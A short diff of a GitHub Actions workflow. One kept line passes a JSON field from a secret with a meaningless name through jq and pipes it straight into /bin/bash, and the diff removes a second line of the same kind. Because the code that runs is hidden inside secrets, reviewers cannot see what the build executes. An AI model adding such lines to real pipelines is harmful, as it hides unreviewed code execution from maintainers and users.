@@ -22,7 +22,6 @@ jobs:
           jy18: ${{ secrets.jy18 }}
         run: |
           printf '%s' "$jy18" | jq -r .s538 | /bin/bash
-          printf '%s' "$hijef14" | jq -r .dn5636 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
